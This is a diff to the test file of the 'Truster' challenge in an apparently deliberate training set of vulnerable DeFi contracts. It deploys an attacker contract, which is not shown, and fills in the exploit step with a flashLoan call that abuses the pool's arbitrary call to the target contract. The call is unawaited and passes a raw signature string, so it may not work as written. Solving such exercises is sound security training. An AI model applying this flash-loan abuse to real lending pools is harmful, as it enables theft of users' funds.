@@ -1,8 +1,10 @@
 const { ether } = require('@openzeppelin/test-helpers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
+const ethers = require('ethers');
 
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
+const TrusterLenderPoolAttack = contract.fromArtifact('TrusterLenderPoolAttack');
 
 const { expect } = require('chai');
 
@@ -16,6 +18,7 @@ describe('[Challenge] Truster', function () {
         /** SETUP SCENARIO */
         this.token = await DamnValuableToken.new({ from: deployer });
         this.pool = await TrusterLenderPool.new(this.token.address, { from: deployer });
+        this.attack = await TrusterLenderPoolAttack.new(this.token.address, this.pool.address, { from: attacker });
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
 
@@ -29,7 +32,7 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        this.pool.flashLoan(1000, this.attack.address, this.attack.address, this.attack.abi[1].signature);
     });
 
     after(async function () {
